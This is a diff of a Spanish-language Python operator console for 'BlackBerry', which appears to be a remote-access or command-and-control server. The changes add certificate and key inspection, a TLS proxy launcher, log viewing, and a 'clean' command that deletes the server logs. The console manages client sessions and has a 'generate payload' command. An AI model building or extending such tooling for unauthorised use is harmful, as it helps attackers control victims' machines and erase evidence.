@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+#lunes 21 de julio de 2025
 """
 BlackBerry - Servidor de administración remota
 
@@ -19,6 +20,8 @@ import readline
 from cryptography.hazmat.primitives.asymmetric import rsa, padding
 from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from cryptography import x509
+from cryptography.hazmat.backends import default_backend
 from colores import *
 
 # Configuración del logging sin códigos de color para el archivo de log.
@@ -26,7 +29,7 @@ logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s - %(levelname)s - %(message)s",
     handlers=[
-        logging.FileHandler("BlackBerry_Server.log"),
+        logging.FileHandler("logs/BlackBerryServer.log"),
         logging.StreamHandler()
     ]
 )
@@ -38,7 +41,6 @@ connections = {}  # {id_conexion: (socket, dirección, aes_key)}
 conn_lock = threading.Lock()
 conn_id_counter = 0
 
-# Lista de comandos disponibles (añadido 'rsa keys')
 COMMANDS = [
     "help", "info", "list", "select", "rsa keys", "set port", "set host",
     "generate payload", "exit", "banner"
@@ -308,6 +310,45 @@ def rebind_server(new_host, new_port):
     except Exception as e:
         logging.exception("Error al rebind del servidor: %s", e)
 
+def mostrar_info_cert(ruta_cert):
+    # Carga el certificado en PEM o DER
+    with open(ruta_cert, 'rb') as f:
+        datos = f.read()
+    try:
+        cert = x509.load_pem_x509_certificate(datos, default_backend())
+    except ValueError:
+        cert = x509.load_der_x509_certificate(datos, default_backend())
+
+    # Imprime los campos principales
+    print("Información del certificado:")
+    print("  Sujeto       :", cert.subject.rfc4514_string())
+    print("  Emisor       :", cert.issuer.rfc4514_string())
+    print("  Válido desde :", cert.not_valid_before)
+    print("  Válido hasta :", cert.not_valid_after)
+    print("  Número serie :", cert.serial_number)
+    print("  Algoritmo    :", cert.signature_hash_algorithm.name)
+    print()
+
+def mostrar_info_key(ruta_key):
+    # Carga la clave privada (sin contraseña)
+    with open(ruta_key, 'rb') as f:
+        datos = f.read()
+    try:
+        clave = serialization.load_pem_private_key(
+            datos,
+            password=None,
+            backend=default_backend()
+        )
+    except ValueError:
+        print("Error: la clave está cifrada o en un formato no soportado.")
+        return
+
+    # Imprime tipo y tamaño de la clave
+    print("Información de la clave privada:")
+    print("  Tipo de clave :", type(clave).__name__)
+    if hasattr(clave, 'key_size'):
+        print("  Tamaño         :", f"{clave.key_size} bits")
+    print("+========================================================================================")
 
 def interactive_shell():
     """Bucle principal de interacción con el operador."""
@@ -316,43 +357,69 @@ def interactive_shell():
         try:
             cmd = input(f"{B_BLUE}{BOLD}BlackBerry> {RESET}").strip()
         except (KeyboardInterrupt, EOFError):
-            print(f"\n{YELLOW}{BOLD}Saliendo de BlackBerry.{RESET}")
-            break
-
-        if cmd == "help":
+            print(f"\n{YELLOW}{BOLD}^C interrupcion detectada, escribe 'exit' para salir.{RESET}")
+            continue
+        if cmd == "help" or cmd == "ayuda":
             help_text = f"""
 {b_white}{BOLD}BlackBerry  - Herramienta de administración remota{RESET}
 
 {b_green}Comandos:{RESET}
   {b_green}help{RESET}{b_white}                   -> Muestra esta ayuda.{RESET}
-  {b_green}info{RESET}{b_white}                   -> Imprime el log completo del servidor.{RESET}
+  {b_green}proxy-tls{RESET}{b_white}              -> inicia el proxy TLS(todo cifrado){RESET}
+  {b_green}loggin{RESET}{b_white}                 -> Imprime el log completo del servidor.{RESET}
+  {b_green}loggin proxy{RESET}{b_white}            -> Imprime el log completo del proxy.{RESET}
   {b_green}list{RESET}{b_white}                   -> Lista conexiones activas.{RESET}
   {b_green}select <ID>{RESET}{b_white}            -> Interactúa con una sesión de cliente.{RESET}
   {b_green}rsa keys{RESET}{b_white}               -> Imprime las claves RSA generadas.{RESET}
+  {b_green}cert{RESET}{b_white}                   -> Imprime info de el certificado y clave del proxy.{RESET}
+  {b_green}new cert{RESET}{b_white}               -> Crea un nuevo ceritificao personalizado en la carpeta cert/{RESET}
   {b_green}set port <PUERTO>{RESET}{b_white}      -> Cambia el puerto de escucha.{RESET}
   {b_green}set host <HOST>{RESET}{b_white}        -> Cambia el host de escucha.{RESET}
   {b_green}generate payload{RESET}{b_white}       -> Genera un payload de cliente.{RESET}
-  {b_red}exit{RESET}{b_red}                   -> Cierra el servidor.{RESET}
-
-"""
+  {b_red}exit{RESET}                   -> Cierra el servidor.{RESET}"""
             print(help_text)
             continue
-
-        elif cmd == "info":
+        if cmd == "proxy-tls":
+              try:
+                  subprocess.Popen(["python3", "BlackBerry_TLSProxyGUI.py"])
+              except Exception as e:
+                   print(f"[!] Error al lanzar GUI: {e}")
+                   try:
+                       subprocess.Popen(["python3", "BlackBerry_TLSProxy.py"],
+                       stdout=subprocess.DEVNULL,
+                       stderr=subprocess.DEVNULL
+            )
+                   except Exception as e2:
+                       print(f"[X] Falló también la versión CLI: {e2}")
+        elif cmd == "clean":
+           os.system("rm logs/BlackBerryServer.log")
+           os.system("rm logs/BlackBerryTLSProxy.log")
+        elif cmd == "loggin":
             try:
-                with open("BlackBerry_Server.log", "r") as f:
+                with open("logs/BlackBerryServer.log", "r") as f:
                     log_content = f.read()
                 print(f"{CYAN}{UNDERLINE}---- LOG DEL SERVIDOR ----{RESET}")
                 print(log_content)
                 print(f"{CYAN}{UNDERLINE}---- FIN DEL LOG ----{RESET}")
             except Exception as e:
                 logging.exception("Error al leer el log: %s", e)
-                print(f"{ALERT} {RED}Error al leer el log: {e}{RESET}")
+                print(f"{ALERT} {RED}Error al leer el log del servidor: {e}{RESET}")
+
+        elif cmd == "loggin proxy":
+            try:
+                with open("logs/BlackBerryTLSProxy.log", "r") as f:
+                    log_content = f.read()
+                print(f"{CYAN}{UNDERLINE}---- LOG DEL PROXY DEL SERVIDOR ----{RESET}")
+                print(log_content)
+                print(f"{CYAN}{UNDERLINE}---- FIN DEL LOG DEL PROXY  ----{RESET}")
+            except Exception as e:
+                logging.exception("Error al leer el log: %s", e)
+                print(f"{ALERT} {RED}Error al leer el log del proxy: {e}{RESET}")
 
         elif cmd == "banner":
             BlackBerrybanner()
 
-        elif cmd == "list":
+        elif cmd == "list" or cmd == "clients":
             with conn_lock:
                 if connections:
                     for cid, (_, addr, aes_key) in connections.items():
@@ -361,6 +428,14 @@ def interactive_shell():
                         print(f"{B_GREEN}{cid}{RESET}: {B_BLUE}{addr[0]}{RESET} - [{B_YELLOW}{addr[1]}{RESET}] | AES Key: {B_MAGENTA}{aes_hex}{RESET}")
                 else:
                     print(f"{YELLOW}No hay conexiones activas.{RESET}")
+        elif cmd == "new cert" or cmd == "cert new":
+            subprocess.run(["python3", "certG.py"])
+ 
+        elif cmd == "cert":
+            CERT_PATH = 'cert/BlackBerry_Server.crt'
+            KEY_PATH  = 'cert/BlackBerry_Server.key'
+            mostrar_info_cert(CERT_PATH)
+            mostrar_info_key(KEY_PATH)
         elif cmd == "rsa keys":
             # Mostrar claves en PEM
             priv_pem = SERVER_PRIVATE_KEY.private_bytes(
@@ -465,7 +540,7 @@ def interactive_shell():
             except Exception as e:
                 logging.exception("Error al cambiar el host: %s", e)
 
-        elif cmd == "generate payload":
+        elif cmd == "generate payload" or cmd == "payload":
             try:
                 import payloadG
                 payloadG.generate_payload()
